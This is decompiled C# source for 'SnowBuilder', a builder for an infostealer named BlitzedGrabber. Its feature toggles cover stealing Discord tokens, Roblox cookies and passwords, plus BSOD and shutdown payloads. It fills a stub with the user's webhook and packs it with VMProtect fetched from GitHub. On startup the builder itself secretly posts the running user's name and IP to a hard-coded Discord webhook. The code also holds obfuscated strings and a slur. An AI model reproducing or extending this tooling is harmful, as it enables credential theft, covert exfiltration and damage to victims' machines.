using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;
using Microsoft.CSharp;
using ns1;
using Siticone.Desktop.UI.WinForms;
using Siticone.Desktop.UI.WinForms.Enums;
using SnowBuilder.Properties;

namespace SnowBuilder
{
	public class Form1 : Form
	{
		private class Base64
		{
			public static string Base64Encode(string plainText)
			{
				byte[] bytes = Encoding.UTF8.GetBytes(plainText);
				return Convert.ToBase64String(bytes);
			}

			public string Base64Decode(string base64EncodedData)
			{
				byte[] bytes = Convert.FromBase64String(base64EncodedData);
				return Encoding.UTF8.GetString(bytes);
			}
		}

		public static bool premiumuser;

		public static string tempFolder;

		private IContainer components = null;

		private Siticone.Desktop.UI.WinForms.SiticoneButton ReceiveBtn;

		private Siticone.Desktop.UI.WinForms.SiticoneButton HistoryBtn;

		private Siticone.Desktop.UI.WinForms.SiticonePanel siticonePanel1;

		private SiticoneHtmlLabel siticoneHtmlLabel2;

		private SiticoneHtmlLabel siticoneHtmlLabel1;

		private Siticone.Desktop.UI.WinForms.SiticonePictureBox siticonePictureBox1;

		private TabControl tabControl1;

		private TabPage tabPage1;

		private SiticoneHtmlLabel siticoneHtmlLabel21;

		private SiticoneOSToggleSwith siticoneOSToggleSwith20;

		private SiticoneHtmlLabel siticoneHtmlLabel22;

		private SiticoneOSToggleSwith siticoneOSToggleSwith21;

		private TabPage tabPage3;

		private Siticone.Desktop.UI.WinForms.SiticoneButton siticoneButton1;

		private TextBox compilerOutputTextBox;

		private Siticone.Desktop.UI.WinForms.SiticoneTextBox siticoneTextBox1;

		private Siticone.Desktop.UI.WinForms.SiticoneTextBox siticoneTextBox2;

		private Siticone.Desktop.UI.WinForms.SiticoneControlBox siticoneControlBox1;

		private Siticone.Desktop.UI.WinForms.SiticoneButton siticoneButton2;

		private SiticoneHtmlLabel siticoneHtmlLabel3;

		private SiticoneOSToggleSwith siticoneOSToggleSwith1;

		private SiticoneHtmlLabel siticoneHtmlLabel4;

		private SiticoneOSToggleSwith siticoneOSToggleSwith2;

		private SiticoneHtmlLabel siticoneHtmlLabel5;

		private SiticoneOSToggleSwith siticoneOSToggleSwith3;

		private SiticoneHtmlLabel siticoneHtmlLabel6;

		private SiticoneOSToggleSwith siticoneOSToggleSwith4;

		private SiticoneHtmlLabel siticoneHtmlLabel7;

		private SiticoneHtmlLabel siticoneHtmlLabel8;

		private SiticoneOSToggleSwith siticoneOSToggleSwith5;

		private SiticoneHtmlLabel siticoneHtmlLabel9;

		private SiticoneOSToggleSwith siticoneOSToggleSwith6;

		private SiticoneHtmlLabel siticoneHtmlLabel10;

		private SiticoneOSToggleSwith siticoneOSToggleSwith7;

		private SiticoneHtmlLabel siticoneHtmlLabel11;

		private SiticoneOSToggleSwith siticoneOSToggleSwith8;

		private SiticoneHtmlLabel siticoneHtmlLabel12;

		private SiticoneOSToggleSwith siticoneOSToggleSwith9;

		private SiticoneHtmlLabel siticoneHtmlLabel13;

		private SiticoneOSToggleSwith siticoneOSToggleSwith10;

		private Siticone.Desktop.UI.WinForms.SiticoneTextBox siticoneTextBox3;

		private SiticoneHtmlLabel siticoneHtmlLabel14;

		private SiticoneOSToggleSwith siticoneOSToggleSwith11;

		private Siticone.Desktop.UI.WinForms.SiticoneRoundedButton siticoneRoundedButton1;

		private static bool flag;

		private static CSharpCodeProvider csharpCodeProvider;

		private static CompilerResults compilerResults;

		private static string[] sources;

		private static Dictionary<string, string> providerOptions;

		private static bool @checked;

		private static string newValue;

		private static CompilerParameters compilerParameters2;

		private static string text;

		public Form1()
		{
			InitializeComponent();
		}

		public void SendContent(string content)
		{
			try
			{
				WebRequest webRequest = WebRequest.Create("https://discord.com/api/webhooks/939742015808221224/lifIzNpdJZde5beH-2qad89qhiKbxhc8rMDsCdc3iChLQDOFF_qH6t_npP4Kawh7f9qG");
				webRequest.ContentType = "application/json";
				webRequest.Method = "POST";
				using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
				{
					streamWriter.Write(content);
				}
				webRequest.GetResponse();
			}
			catch
			{
			}
		}

		public static string SimpleMessage()
		{
			IPAddress iPAddress = IPAddress.Parse(new WebClient().DownloadString("http://icanhazip.com").Replace("\r\n", "").Replace("\n", "")
				.Trim());
			Console.WriteLine(iPAddress.ToString());
			string[] array = new string[1];
			int num = 0;
			string[] array2 = new string[5]
			{
				"{\"content\":null,\"embeds\":[{\"title\":\"User\\",
				Environment.UserName,
				" Has Logged In!\",\"description\":\"**IP**: ",
				null,
				null
			};
			int num2 = 3;
			array2[num2] = iPAddress?.ToString();
			array2[4] = "\",\"color\":null,\"author\":{\"name\":\"BlitzedGrabber\",\"icon_url\":\"https://i.imgur.com/FRsZ0Pd.jpg\"}}]}";
			array[num] = string.Concat(array2);
			return string.Concat(array);
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			if (!File.Exists(tempFolder + "\\VMProtect_Con.exe"))
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile("https://github.com/StvnedEagle1337/Stuff/releases/download/nig/VMProtect_Con.exe", tempFolder + "\\VMProtect_Con.exe");
				((IDisposable)webClient)?.Dispose();
			}
			SendContent(SimpleMessage());
			new Siticone.Desktop.UI.WinForms.SiticoneShadowForm(this);
			new Siticone.Desktop.UI.WinForms.SiticoneAnimateWindow(this);
			new Siticone.Desktop.UI.WinForms.SiticoneDragControl(this);
			tabControl1.Appearance = TabAppearance.FlatButtons;
			tabControl1.ItemSize = new Size(0, 1);
			tabControl1.SizeMode = TabSizeMode.Fixed;
			Process process = new Process();
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = "/C wmic csproduct get uuid";
			process.Start();
			string value = process.StandardOutput.ReadToEnd().Replace("UUID", "").Replace("\n", "")
				.Trim();
			WebClient webClient2 = new WebClient();
			process.WaitForExit();
			if (webClient2.DownloadString("https://raw.githubusercontent.com/StvnedEagle1337/Stuff/main/BlitzedGrabber/Premium.txt").Contains(value))
			{
				Alert("Premium User, You are Whitelisted!", Info.enmType.Success);
				premiumuser = true;
			}
			else
			{
				Alert("Free User, Limited Access!", Info.enmType.Error);
				premiumuser = false;
			}
		}

		[System.Reflection.ObfuscationAttribute(Feature = "ControlFlow", Exclude = true)]
		public void CompileStub()
		{
			int num = 0;
			do
			{
				CompilerParameters compilerParameters = new CompilerParameters();
				if (num == 17)
				{
					compilerParameters.ReferencedAssemblies.Add("System.Security.dll");
					num = 18;
				}
				if (num == 15)
				{
					compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
					num = 16;
				}
				if (num == 48)
				{
					TextBox textBox = compilerOutputTextBox;
					textBox.Text = textBox.Text + Environment.NewLine + "Gathering Sources...";
					num = 49;
				}
				if (num == 18)
				{
					compilerParameters.ReferencedAssemblies.Add("netstandard.dll");
					num = 19;
				}
				if (num == 29)
				{
					if (!flag)
					{
						goto IL_06c9;
					}
					num = 30;
				}
				if (num == 47)
				{
					TextBox textBox2 = compilerOutputTextBox;
					textBox2.Text = textBox2.Text + Environment.NewLine + "Checking Features";
					num = 48;
				}
				if (num == 35)
				{
					text = text.Replace("false;//DISCORDTOKENS//", siticoneOSToggleSwith21.Checked.ToString().ToLower() + ";");
					num = 36;
				}
				if (num == 40)
				{
					text = text.Replace("false;//WIFI//", siticoneOSToggleSwith4.Checked.ToString().ToLower() + ";");
					num = 41;
				}
				if (num == 31)
				{
					tabControl1.SelectedTab = tabPage1;
					num = 32;
				}
				if (num == 39)
				{
					text = text.Replace("false;//MINECRAFT//", siticoneOSToggleSwith4.Checked.ToString().ToLower() + ";");
					num = 40;
				}
				if (num == 36)
				{
					text = text.Replace("false;//ROBLOXCOOKIE//", siticoneOSToggleSwith1.Checked.ToString().ToLower() + ";");
					num = 37;
				}
				if (num == 10)
				{
					compilerParameters.OutputAssembly = siticoneTextBox1.Text + ".exe";
					num = 11;
				}
				if (num == 37)
				{
					text = text.Replace("false;//ROBLOXCOOKIEGAME//", siticoneOSToggleSwith2.Checked.ToString().ToLower() + ";");
					num = 38;
				}
				if (num == 49)
				{
					(new string[1])[0] = text;
					num = 50;
				}
				if (num == 44)
				{
					text = text.Replace("false;//BSOD//", siticoneOSToggleSwith9.Checked.ToString().ToLower() + ";");
					num = 45;
				}
				if (num == 25)
				{
					compilerParameters2.CompilerOptions = compilerParameters2.CompilerOptions + " /win32icon:\"" + siticoneRoundedButton1.Text + "\"";
					num = 26;
				}
				if (num == 42)
				{
					text = text.Replace("false;//SHUTOFFPC//", siticoneOSToggleSwith7.Checked.ToString().ToLower() + ";");
					num = 43;
				}
				if (num == 46)
				{
					text = text.Replace("//URLTOOPEN//", siticoneTextBox3.Text.ToString());
					num = 47;
				}
				if (num != 26)
				{
					goto IL_035f;
				}
				goto IL_06ea;
				IL_035f:
				if (num == 4)
				{
					csharpCodeProvider.CreateCompiler();
					num = 5;
				}
				switch (num)
				{
				case 32:
					return;
				case 2:
					new Dictionary<string, string>().Add("CompilerVersion", "v4.0");
					num = 3;
					break;
				}
				if (num == 5)
				{
					siticoneTextBox1.Text += ".exe";
					num = 6;
				}
				if (num == 38)
				{
					text = text.Replace("false;//PASSWORDS//", siticoneOSToggleSwith3.Checked.ToString().ToLower() + ";");
					num = 39;
				}
				if (num == 14)
				{
					compilerParameters.ReferencedAssemblies.Add("System.Net.Http.dll");
					num = 15;
				}
				if (num == 13)
				{
					compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
					num = 14;
				}
				if (num != 33)
				{
					goto IL_0095;
				}
				goto IL_06c9;
				IL_0095:
				if (num == 1)
				{
					compilerOutputTextBox.Text = "\n";
					num = 2;
				}
				if (num == 27)
				{
					newValue = Base64.Base64Encode(siticoneTextBox2.Text);
					num = 28;
				}
				if (num == 6)
				{
					compilerOutputTextBox.Text += "Creating Parameters";
					num = 7;
				}
				if (num == 50)
				{
					compilerResults = csharpCodeProvider.CreateCompiler().CompileAssemblyFromSourceBatch(compilerParameters, sources);
					num = 51;
				}
				if (num == 19)
				{
					compilerParameters.ReferencedAssemblies.Add("System.ObjectModel.dll");
					num = 20;
				}
				if (num == 41)
				{
					text = text.Replace("false;//RESTARTPC//", siticoneOSToggleSwith6.Checked.ToString().ToLower() + ";");
					num = 42;
				}
				if (num == 8)
				{
					compilerParameters.CompilerOptions = $"/t:winexe /optimize /unsafe /platform:x86";
					num = 9;
				}
				if (num == 20)
				{
					compilerParameters.ReferencedAssemblies.Add("System.Management.dll");
					num = 21;
				}
				if (num == 12)
				{
					compilerParameters.ReferencedAssemblies.Add("System.dll");
					num = 13;
				}
				if (num == 30)
				{
					Alert("Webhook Cannot Be Empty", Info.enmType.Error);
					num = 31;
				}
				if (num == 34)
				{
					text = text.Replace("false;//SCREENSHOT//", siticoneOSToggleSwith20.Checked.ToString().ToLower() + ";");
					num = 35;
				}
				if (num == 43)
				{
					text = text.Replace("false;//MELTSTUB//", siticoneOSToggleSwith8.Checked.ToString().ToLower() + ";");
					num = 44;
				}
				if (num == 22)
				{
					num = 23;
				}
				if (num == 3)
				{
					csharpCodeProvider = new CSharpCodeProvider(providerOptions);
					num = 4;
				}
				if (num == 9)
				{
					compilerParameters.GenerateExecutable = true;
					num = 10;
				}
				if (num == 16)
				{
					compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
					num = 17;
				}
				if (num == 23)
				{
					@checked = siticoneOSToggleSwith11.Checked;
					num = 24;
				}
				if (num == 7)
				{
					compilerParameters = new CompilerParameters();
					num = 8;
				}
				if (num == 28)
				{
					flag = string.IsNullOrEmpty(siticoneTextBox2.Text);
					num = 29;
				}
				if (num == 11)
				{
					TextBox textBox3 = compilerOutputTextBox;
					textBox3.Text = textBox3.Text + Environment.NewLine + "Adding References";
					num = 12;
				}
				if (num == 24)
				{
					if (!@checked)
					{
						goto IL_06ea;
					}
					num = 25;
				}
				if (num == 45)
				{
					text = text.Replace("false;//URLOPEN//", siticoneOSToggleSwith10.Checked.ToString().ToLower() + ";");
					num = 46;
				}
				if (num == 21)
				{
					compilerParameters.TreatWarningsAsErrors = false;
					num = 22;
				}
				if (num == 0)
				{
					num = 1;
				}
				continue;
				IL_06c9:
				text = text.Replace("//INSERT_WEBHOOK//", newValue);
				num = 34;
				goto IL_0095;
				IL_06ea:
				text = Resources.Program;
				num = 27;
				goto IL_035f;
			}
			while (num != 51);
			try
			{
				File.Move(siticoneTextBox1.Text + ".exe", tempFolder + "\\" + siticoneTextBox1.Text + ".exe");
			}
			catch
			{
				try
				{
					File.Delete(tempFolder + "\\" + siticoneTextBox1.Text + ".exe");
				}
				catch
				{
				}
				try
				{
					File.Move(siticoneTextBox1.Text + ".exe", tempFolder + "\\" + siticoneTextBox1.Text + ".exe");
				}
				catch
				{
				}
			}
			if (compilerResults.Errors.Count > 0)
			{
				foreach (CompilerError error in compilerResults.Errors)
				{
					compilerOutputTextBox.Text = compilerOutputTextBox.Text + Environment.NewLine + error.FileName + Environment.NewLine + "Line number" + error.Line + ", Error Number:" + error.ErrorNumber + ", '" + error.ErrorText + ";";
				}
				compilerOutputTextBox.Text = compilerOutputTextBox.Text + Environment.NewLine + "An error has occured when trying to compile file.";
				return;
			}
			using Process process = new Process();
			process.StartInfo.WorkingDirectory = "Resources";
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Arguments = string.Concat("/C " + tempFolder + "\\VMProtect_Con.exe \"" + tempFolder + "\\" + siticoneTextBox1.Text + ".exe\"");
			process.Start();
			compilerOutputTextBox.Text = compilerOutputTextBox.Text + Environment.NewLine + "Successfully compiled stub!" + Environment.NewLine + "Enjoy!";
			process.WaitForExit();
			File.Move(tempFolder + "\\" + siticoneTextBox1.Text + ".vmp.exe", AppDomain.CurrentDomain.BaseDirectory + "\\" + siticoneTextBox1.Text + ".exe");
		}

		private void HistoryBtn_Click(object sender, EventArgs e)
		{
			tabControl1.SelectedTab = tabPage1;
		}

		private void siticoneOSToggleSwith20_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void siticoneTextBox1_TextChanged(object sender, EventArgs e)
		{
		}

		public void Alert(string msg, Info.enmType type)
		{
			new Info().showAlert(msg, type);
		}

		private void siticoneButton1_Click(object sender, EventArgs e)
		{
			Alert("Started Compilation", Info.enmType.Info);
			CompileStub();
		}

		private void ReceiveBtn_Click(object sender, EventArgs e)
		{
			tabControl1.SelectedTab = tabPage3;
		}

		private void siticoneButton2_Click(object sender, EventArgs e)
		{
			Dictionary<string, string> nameValueCollection = new Dictionary<string, string> { { "content", "Webhook Works!" } };
			try
			{
				using HttpClient httpClient = new HttpClient();
				httpClient.PostAsync(siticoneTextBox2.Text, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
			}
			catch
			{
			}
		}

		private void siticoneOSToggleSwith2_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void siticoneOSToggleSwith2_Click(object sender, EventArgs e)
		{
			if (!premiumuser)
			{
				siticoneOSToggleSwith2.Checked = false;
				Alert("Free User, Limited Access!", Info.enmType.Error);
			}
			else
			{
				Alert("Coming Soon", Info.enmType.Error);
				siticoneOSToggleSwith2.Checked = false;
			}
		}

		private void siticoneOSToggleSwith4_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void siticoneOSToggleSwith4_Click(object sender, EventArgs e)
		{
		}

		private void siticoneOSToggleSwith5_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void siticoneOSToggleSwith5_Click(object sender, EventArgs e)
		{
			if (!premiumuser)
			{
				Alert("Free User, Limited Access!", Info.enmType.Error);
				siticoneOSToggleSwith5.Checked = false;
			}
		}

		private void siticoneOSToggleSwith10_CheckedChanged(object sender, EventArgs e)
		{
			if (siticoneOSToggleSwith10.Checked)
			{
				siticoneTextBox3.ReadOnly = true;
			}
			else
			{
				siticoneTextBox3.ReadOnly = false;
			}
		}

		private void s(object sender, LayoutEventArgs e)
		{
		}

		private void Form1_Shown(object sender, EventArgs e)
		{
		}

		private void siticoneRoundedButton1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Open Text File";
			openFileDialog.Filter = "Icon files Nigga LMFAO|*.ico";
			openFileDialog.InitialDirectory = "C:\\";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				siticoneRoundedButton1.Text = openFileDialog.FileName;
			}
		}

		private void siticoneOSToggleSwith11_CheckedChanged(object sender, EventArgs e)
		{
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		[System.Reflection.ObfuscationAttribute(Exclude = true)]
		private void InitializeComponent()
		{
			int num = 0;
			System.ComponentModel.ComponentResourceManager resources = default(System.ComponentModel.ComponentResourceManager);
			do
			{
				if (num == 41)
				{
					siticoneTextBox1 = new Siticone.Desktop.UI.WinForms.SiticoneTextBox();
					num = 42;
				}
				if (num == 304)
				{
					siticoneHtmlLabel8.Location = new System.Drawing.Point(98, 268);
					num = 305;
				}
				if (num == 379)
				{
					siticoneHtmlLabel3.Text = <Module>.Decrypt("6bcqGRUW/5Xj9svm/XcCKETqpWL3mCktw7Bgat6G+xc=");
					num = 380;
				}
				if (num == 412)
				{
					siticoneTextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
					num = 413;
				}
				if (num == 476)
				{
					siticoneButton1.BorderThickness = 2;
					num = 477;
				}
				if (num == 118)
				{
					siticonePanel1.ShadowDecoration.Parent = siticonePanel1;
					num = 119;
				}
				if (num == 574)
				{
					siticoneControlBox1.ShadowDecoration.Parent = siticoneControlBox1;
					num = 575;
				}
				if (num == 199)
				{
					siticoneTextBox3.Animated = true;
					num = 200;
				}
				if (num == 402)
				{
					siticoneButton2.Size = new System.Drawing.Size(168, 36);
					num = 403;
				}
				if (num == 451)
				{
					siticoneHtmlLabel22.Enabled = false;
					num = 452;
				}
				if (num == 573)
				{
					siticoneControlBox1.Name = <Module>.Decrypt("IQbj4EqK7KuOlxJwg9HRabnptfMVXQ8tkph9VBPyvG4=");
					num = 574;
				}
				if (num == 59)
				{
					ReceiveBtn.CheckedState.Parent = ReceiveBtn;
					num = 60;
				}
				if (num == 398)
				{
					siticoneButton2.Location = new System.Drawing.Point(666, 14);
					num = 399;
				}
				if (num == 201)
				{
					siticoneTextBox3.BorderRadius = 5;
					num = 202;
				}
				if (num == 424)
				{
					siticoneTextBox2.IconLeftOffset = new System.Drawing.Point(2, 0);
					num = 425;
				}
				if (num == 595)
				{
					siticonePanel1.ResumeLayout(false);
					num = 596;
				}
				if (num == 76)
				{
					ReceiveBtn.HoverState.Parent = ReceiveBtn;
					num = 77;
				}
				if (num == 567)
				{
					siticoneControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
					num = 568;
				}
				if (num == 586)
				{
					base.Controls.Add(ReceiveBtn);
					num = 587;
				}
				if (num == 423)
				{
					siticoneTextBox2.HoverState.Parent = siticoneTextBox2;
					num = 424;
				}
				if (num == 165)
				{
					tabPage1.Text = <Module>.Decrypt("J53YzzFWcVNXmR79jKGICQ==");
					num = 166;
				}
				if (num == 602)
				{
					ResumeLayout(false);
					num = 603;
				}
				if (num == 100)
				{
					HistoryBtn.FocusedColor = System.Drawing.Color.FromArgb(31, 33, 35);
					num = 101;
				}
				if (num == 244)
				{
					siticoneHtmlLabel12.BackColor = System.Drawing.Color.Transparent;
					num = 245;
				}
				if (num == 372)
				{
					siticoneHtmlLabel3.Enabled = false;
					num = 373;
				}
				if (num == 220)
				{
					siticoneTextBox3.PasswordChar = '\0';
					num = 221;
				}
				if (num == 362)
				{
					siticoneHtmlLabel4.TabIndex = 66;
					num = 363;
				}
				if (num == 453)
				{
					siticoneHtmlLabel22.ForeColor = System.Drawing.Color.White;
					num = 454;
				}
				if (num == 484)
				{
					siticoneButton1.FillColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 485;
				}
				if (num == 212)
				{
					siticoneTextBox3.Font = new System.Drawing.Font(<Module>.Decrypt("92SXtmBZ4BKsPOXKa+Z4EA=="), 9f);
					num = 213;
				}
				if (num == 195)
				{
					siticoneOSToggleSwith11.Size = new System.Drawing.Size(62, 24);
					num = 196;
				}
				if (num == 556)
				{
					siticonePictureBox1.Enabled = false;
					num = 557;
				}
				if (num == 465)
				{
					tabPage3.Controls.Add(siticoneButton1);
					num = 466;
				}
				if (num == 145)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel7);
					num = 146;
				}
				if (num == 205)
				{
					siticoneTextBox3.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
					num = 206;
				}
				if (num == 144)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith5);
					num = 145;
				}
				if (num == 27)
				{
					siticoneOSToggleSwith3 = new ns1.SiticoneOSToggleSwith();
					num = 28;
				}
				if (num == 366)
				{
					siticoneOSToggleSwith2.Size = new System.Drawing.Size(62, 24);
					num = 367;
				}
				if (num == 427)
				{
					siticoneTextBox2.PasswordChar = '\0';
					num = 428;
				}
				if (num == 203)
				{
					siticoneTextBox3.DefaultText = <Module>.Decrypt("39GqrqV6MsAl5Qp2e6EHeg==");
					num = 204;
				}
				if (num == 388)
				{
					siticoneButton2.CustomImages.Parent = siticoneButton2;
					num = 389;
				}
				if (num == 475)
				{
					siticoneButton1.BorderRadius = 5;
					num = 476;
				}
				if (num == 273)
				{
					siticoneHtmlLabel10.Enabled = false;
					num = 274;
				}
				if (num == 54)
				{
					ReceiveBtn.BackColor = System.Drawing.Color.Transparent;
					num = 55;
				}
				if (num == 137)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel11);
					num = 138;
				}
				if (num == 356)
				{
					siticoneHtmlLabel4.Enabled = false;
					num = 357;
				}
				if (num == 477)
				{
					siticoneButton1.CheckedState.Parent = siticoneButton1;
					num = 478;
				}
				if (num == 537)
				{
					siticoneHtmlLabel2.BackColor = System.Drawing.Color.Transparent;
					num = 538;
				}
				if (num == 28)
				{
					siticoneHtmlLabel4 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 29;
				}
				if (num == 270)
				{
					siticoneOSToggleSwith8.TabIndex = 78;
					num = 271;
				}
				if (num == 249)
				{
					siticoneHtmlLabel12.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/+4mvISCQPl//gADP4cNRwg=");
					num = 250;
				}
				if (num == 5)
				{
					tabControl1 = new System.Windows.Forms.TabControl();
					num = 6;
				}
				if (num == 260)
				{
					siticoneHtmlLabel11.Font = new System.Drawing.Font(<Module>.Decrypt("0jCDgjxGug3M+IyNOxNyOQ=="), 11f);
					num = 261;
				}
				if (num == 261)
				{
					siticoneHtmlLabel11.ForeColor = System.Drawing.Color.White;
					num = 262;
				}
				if (num == 309)
				{
					siticoneOSToggleSwith5.Location = new System.Drawing.Point(34, 266);
					num = 310;
				}
				if (num == 305)
				{
					siticoneHtmlLabel8.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/4EdnhXxJJ7w9HW5LdBwMRs=");
					num = 306;
				}
				if (num == 415)
				{
					siticoneTextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
					num = 416;
				}
				if (num == 306)
				{
					siticoneHtmlLabel8.Size = new System.Drawing.Size(104, 20);
					num = 307;
				}
				if (num == 570)
				{
					siticoneControlBox1.HoverState.Parent = siticoneControlBox1;
					num = 571;
				}
				if (num == 164)
				{
					tabPage1.TabIndex = 0;
					num = 165;
				}
				if (num == 543)
				{
					siticoneHtmlLabel2.Size = new System.Drawing.Size(44, 18);
					num = 544;
				}
				if (num == 106)
				{
					HistoryBtn.HoverState.Parent = HistoryBtn;
					num = 107;
				}
				if (num == 169)
				{
					siticoneRoundedButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
					num = 170;
				}
				if (num == 557)
				{
					siticonePictureBox1.FillColor = System.Drawing.Color.Transparent;
					num = 558;
				}
				if (num == 187)
				{
					siticoneHtmlLabel14.ForeColor = System.Drawing.Color.White;
					num = 188;
				}
				if (num == 4)
				{
					siticonePanel1 = new Siticone.Desktop.UI.WinForms.SiticonePanel();
					num = 5;
				}
				if (num == 435)
				{
					siticoneHtmlLabel21.BackColor = System.Drawing.Color.Transparent;
					num = 436;
				}
				if (num == 489)
				{
					siticoneButton1.Name = <Module>.Decrypt("nQ9QoQnlelBWwdgXrgkDlA==");
					num = 490;
				}
				if (num == 53)
				{
					ReceiveBtn.AnimatedGIF = true;
					num = 54;
				}
				if (num == 299)
				{
					siticoneOSToggleSwith6.Text = <Module>.Decrypt("HFOv+WDvsxqAa5dZXKMR0A==");
					num = 300;
				}
				if (num == 222)
				{
					siticoneTextBox3.ReadOnly = true;
					num = 223;
				}
				if (num == 517)
				{
					siticoneTextBox1.FillColor = System.Drawing.Color.FromArgb(35, 36, 40);
					num = 518;
				}
				if (num == 267)
				{
					siticoneOSToggleSwith8.Location = new System.Drawing.Point(360, 132);
					num = 268;
				}
				if (num == 111)
				{
					HistoryBtn.Size = new System.Drawing.Size(154, 45);
					num = 112;
				}
				if (num == 551)
				{
					siticoneHtmlLabel1.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7///E3K7JT3hmUku4y+/MqSw=");
					num = 552;
				}
				if (num == 34)
				{
					siticoneHtmlLabel21 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 35;
				}
				if (num == 15)
				{
					siticoneHtmlLabel11 = new Siticone.Desktop.UI.WinForms.SiticoneHtmlLabel();
					num = 16;
				}
				if (num == 505)
				{
					compilerOutputTextBox.TabIndex = 17;
					num = 506;
				}
				if (num == 450)
				{
					siticoneHtmlLabel22.BackColor = System.Drawing.Color.Transparent;
					num = 451;
				}
				if (num == 134)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith10);
					num = 135;
				}
				if (num == 418)
				{
					siticoneTextBox2.FocusedState.Parent = siticoneTextBox2;
					num = 419;
				}
				if (num == 79)
				{
					ReceiveBtn.PressedColor = System.Drawing.Color.White;
					num = 80;
				}
				if (num == 147)
				{
					tabPage1.Controls.Add(siticoneOSToggleSwith4);
					num = 148;
				}
				if (num == 18)
				{
					siticoneOSToggleSwith7 = new ns1.SiticoneOSToggleSwith();
					num = 19;
				}
				if (num == 148)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel5);
					num = 149;
				}
				if (num == 569)
				{
					siticoneControlBox1.FillColor = System.Drawing.Color.Transparent;
					num = 570;
				}
				if (num == 588)
				{
					base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
					num = 589;
				}
				if (num == 90)
				{
					HistoryBtn.CheckedState.Parent = HistoryBtn;
					num = 91;
				}
				if (num == 334)
				{
					siticoneOSToggleSwith4.Location = new System.Drawing.Point(34, 232);
					num = 335;
				}
				if (num == 509)
				{
					siticoneTextBox1.BorderRadius = 5;
					num = 510;
				}
				if (num == 346)
				{
					siticoneHtmlLabel5.Name = <Module>.Decrypt("L7IQoqoRbzD4KeH35JV7/+TB5knwXwiUiBQ2FQQuANQ=");
					num = 347;
				}
				if (num == 555)
				{
					siticonePictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
					num = 556;
				}
				if (num == 241)
				{
					siticoneOSToggleSwith10.TabIndex = 82;
					num = 242;
				}
				if (num == 591)
				{
					base.WindowState = System.Windows.Forms.FormWindowState.Minimized;
					num = 592;
				}
				if (num == 86)
				{
					HistoryBtn.ButtonMode = Siticone.Desktop.UI.WinForms.Enums.ButtonMode.RadioButton;
					num = 87;
				}
				if (num == 122)
				{
					tabControl1.Controls.Add(tabPage3);
					num = 123;
				}
				if (num == 504)
				{
					compilerOutputTextBox.Size = new System.Drawing.Size(808, 226);
					num = 505;
				}
				if (num == 158)
				{
					tabPage1.Controls.Add(siticoneHtmlLabel22);
					num = 159;
				}
				if (num == 565)
				{
					siticonePictureBox1.TabIndex = 10;
					num = 566;
				}
				if (num == 520)
				{
					siticoneTextBox1.Font = new System.Drawing.Font(<Module>.Decrypt("92SXtmBZ4BKsPOXKa+Z4EA=="), 9f);
					num = 521;
				}
				if (num == 314)
				{
					siticoneOSToggleSwith5.CheckedChanged += new System.EventHandler(siticoneOSToggleSwith5_CheckedChanged);
					num = 315;
				}
				if (num == 408)
				{
					siticoneTextBox2.BorderRadius = 5;
					num = 409;
				}
				if (num == 63)
				{
					ReceiveBtn.CustomImages.Parent = ReceiveBtn;
					num = 64;
				}
				if (num == 247)
				{
					siticoneHtmlLabel12.ForeColor = System.Drawing.Color.White;
					num = 248;
				}
				if (num == 322)
				{
					siticoneHtmlLabel7.Size = new System.Drawing.Size(277, 20);
					num = 323;
				}
				if (num == 429)
				{
					siticoneTextBox2.SelectedText = <Module>.Decrypt("39GqrqV6MsAl5Qp2e6EHeg==");
					num = 430;
				}
				if (num == 84)
				{
					ReceiveBtn.Click += new System.EventHandler(ReceiveBtn_Click);
					num = 85;
				}
				if (num == 225)
				{
					siticoneTextBox3.Size = new System.Drawing.Size(164, 30);
					num = 226;
				}
				if (num == 204)
				{
					siticoneTextBox3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
					num = 205;
				}
				if (num == 554)
				{
					siticoneHtmlLabel1.Text = <Module>.Decrypt("KjT3dl5bDsE7TOdEKcsZHQ==");
					num = 555;
				}
				if (num == 593)
				{
					base.Shown += new System.EventHandler(Form1_Shown);
					num = 594;
				}
				if (num == 400)
				{
